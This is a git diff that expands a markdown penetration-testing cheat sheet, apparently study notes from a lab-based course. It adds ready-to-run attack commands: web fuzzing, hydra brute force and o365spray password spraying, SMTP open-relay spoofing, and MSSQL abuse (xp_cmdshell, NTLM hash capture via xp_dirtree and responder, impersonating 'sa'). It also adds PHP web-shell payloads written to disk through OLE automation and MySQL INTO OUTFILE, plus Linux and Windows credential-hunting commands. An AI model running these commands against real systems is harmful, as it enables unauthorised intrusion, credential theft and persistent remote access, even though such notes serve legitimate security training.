@@ -12,6 +12,12 @@
         - [IMAP/ POP3](#imap-pop3-ports-110-143-993-995)
         - [MSSQL](#mssql-port-1433)
         - [MySQL](#mysql-port-3306)
+- [Enumeration](#enumeration)
+        - [Linux](#linux)
+        - [Windows](#windows)
+- [Exploit](#exploit)
+        - [Linux](#linux-1)
+        - [Windows](#windows-1)
 - [Active Directory](#active-directory)
 
 ## Recon
@@ -73,6 +79,19 @@ hydra -L username.list -P password.list ssh://IP
 
 #### HTTP/ HTTPS Ports 80/ 443
 ```c
+#Subdomain Enumeration
+ffuf -w wordlist.txt -u http://FUZZ.IP:PORT
+
+#Directory Enumeration
+ffuf -w wordlist.txt -u http://IP:PORT/FUZZ -recursion
+##Exentsion Fuzz
+ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://IP:PORT/blog/indexFUZZ
+
+##Parameter Fuzz
+ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://IP:PORT/admin/admin.php?FUZZ=key
+
+#HTTP/S Brute Force
+hydra -L user.txt -P pass.list IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
 ```
 
 #### SMB/ Samba Ports 137, 138, 139, 445
@@ -122,10 +141,83 @@ Linux
 
 #### IMAP/ POP3 Ports 110, 143, 993, 995
 ```c
+#Misconfiguration
+telnet IP 25
+    - VRFY username
+    - EXPN group_name
+    - RCPT TO name
+    - USER name
+smtp-user-enum -M RCPT -U userlist.txt -D domain_name -t IP
+python3 o365spray.py --validate --domain domain_name
+python3 o365spray.py --enum -U users.txt --domain domain_name
+
+#Brute Force
+hydra -L users.txt -P pass.txt -f IP pop3
+python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain domain_name
+
+#Open relay
+nmap -p25 -Pn --script smtp-open-relay IP
+swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: ' --body '' --server IP
+
+#IMAP
+    #Connect
+    openssl s_client -connect IP:imaps
+    tag login user pass
+    #Commands
+    tag LIST "" *
+    tag SELECT name
+    #How to access email
+    tag FETCH 1 (BODY[HEADER])
+    tag FETCH 1 BODY[TEXT]
+
+#POP3
+    #Connect
+    openssl s_client -connect IP:pop3s
+    telnet IP 110
+    #Commands
+    USER username
+    PASS password
+    LIST
+    RETR id
 ```
 
 #### MSSQL Port 1433
 ```c
+#Connect
+    Linux
+        python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py username@IP -windows-auth
+        sqsh -S IP -U username -P Password123
+    Windows
+        sqlcmd -S IP -U username -P Password123
+
+#Commands
+    Setup
+        xp_cmdshell 'whoami'
+        GO
+
+#Exploits
+    Stealing Hashes
+        On Attack: sudo responder -I tun0
+        On Target:
+            EXEC master..xp_dirtree '\\local IP\share\' -> GO
+            EXEC master..xp_subdirs '\\local IP\share\' -> GO
+        On Attack:
+            sudo impacket-smbserver share ./ -smb2support 
+            hashcat -m 5600 wordlist hash_file
+
+    Impersonate User
+        SELECT distinct b.name -> FROM sys.server_permissions a -> INNER JOIN sys.server_principals b -> ON a.grantor_principal_id = b.principal_id -> WHERE a.permission_name = 'IMPERSONATE' -> GO
+        SELECT SYSTEM_USER -> SELECT IS_SRVROLEMEMBER('sysadmin') -> GO
+        If returns 0
+            EXECUTE AS LOGIN = 'sa' ->SELECT SYSTEM_USER -> SELECT IS_SRVROLEMEMBER('sysadmin') -> GO
+
+    Write Local Files
+        Enable ole automation procedures
+            sp_configure 'show advanced options', 1 -> GO -> RECONFIGURE -> GO -> sp_configure 'Ole Automation Procedures', 1 -> GO -> RECONFIGURE -> GO
+        Create file
+            DECLARE @OLE INT -> DECLARE @FileID INT -> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT -> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1 -> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>' -> EXECUTE sp_OADestroy @FileID -> EXECUTE sp_OADestroy @OLE -> GO
+        Read local file
+            SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents -> GO
 
 ```
 
@@ -138,27 +230,138 @@ Linux
     mysql -u username -ppass -h IP
 
 #Commands
-show databases;
-select version();
-use database;
-show tables;
-show columns from table;
-select * from <table> where <column> = "<string>";
+    show databases;
+    select version();
+    use database;
+    show tables;
+    show columns from table;
+    select * from <table> where <column> = "<string>";
+
+#SQLi
+    #Write to local file
+        SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
+        Then navigate to directory and do webshell.php?c=COMMAND
+    #Read local file
+        select LOAD_FILE("/etc/passwd");
+    #Find file privilege
+        show variables like "secure_file_priv";
 ```
 
 
 ## Enumeration
 
 ### Linux
+```c
+#SUID
+    find / -type f -perm -04000 -ls 2>/dev/null
 
+#Cron
+    cat /etc/crontab
+    ls -la /etc/cron.daily/
+
+#Host Info
+    cat /etc/os-release
+    uname -a  or  cat /proc/version
+    cat /etc/lsb-release
+    /etc/sudoers  -  who can run what as sudo
+    env:  shows environment variables
+    cat /etc/shells:  what shells can run on target
+
+#User Info
+    whoami:  what user are we
+    id:  what groups
+    lastlog:  Last login date/time
+    hostname:  what is server name
+    sudo -V:  sudo version
+    sudo -l:  what can we run as sudo
+    Execute as different user
+        find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
+        find / -uid 0 -perm -6000 -type f 2>/dev/null
+
+#Files
+    Writeable
+        Directories:  find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
+        Files:  find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
+    Hidden
+        Directories:  find / -type d -name ".*" -ls 2>/dev/null
+        Files:  find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student
+    Credential
+        etc/passwd
+        etc/shadow
+        find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
+
+#Network info
+    ifconfig or ip -a:  ip information
+    route  or  netstat -rn:  Available networks
+    /etc/resolv.conf:  find DNS information
+    arp -a:  see arp table
+
+#Services
+    ps aux | grep root
+    ps au
+    apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
+
+```
 ### Windows
+```c
+#System Info
+    tasklist /svc  -  running services
+    set  -  Path variables
+    systeminfo  -  config info
+    [environment]::OSVersion.Version - Window Version
+    wmic qfe  -  Patch level
+    cmd /c echo %PATH%  -  PATH variable
+    CMD
+        wmic qfe  -  Displays available patches
+        wmic product get name  -  Installed programs
+        Named Pipes
+            pipelist.exe /accepteula
+            accesschk.exe /accepteula \.\Pipe\lsass -v
+            accesschk.exe -accepteula -w \pipe\WindscribeService -v
+    PS1
+        Get-HotFix | ft -AutoSize  -  Displays available patches
+        Get-WmiObject -Class Win32_Product | select Name, Version  -  Installed programs
+        Named Pipes:  applications/ processes that share information
+            gci \.\pipe\
 
+#User Info
+    whoami
+    whoami /priv
+    whoami /groups
+    whoami /user
+    query user  -  logged in users
+    echo %USERNAME%  -  current user
+    net user  -  all users
+    net localgroup  -  all groups
+    net localgroup Group_Name  -  info about a group
+    net accounts  -  password policy
+    
+#Network Info
+    ipconfig /all
+    arp -a
+    route print
+    netstat -ano  -  Running processes  -  Use tasklist /svc and the PID to find the name
+
+#Credential Hunting
+    /windows/panther/unattend.xml
+    findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.dll *.mof
+    findstr /si password *.xml *.ini *.txt *.config *.dll *.mof
+    findstr /spin "password" *.*
+    (Get-PSReadLineOption).HistorySavePath
+    cmdkey /list
+
+#Scheduled Tasks
+    schtasks /query /fo LIST /v
+    Get-ScheduledTask | select TaskName,State
+```
 ## Exploit
 
 ### Linux
-
+```c
+```
 ### Windows
-
+```c
+```
 
 ## Active Directory
 ### Enumeration
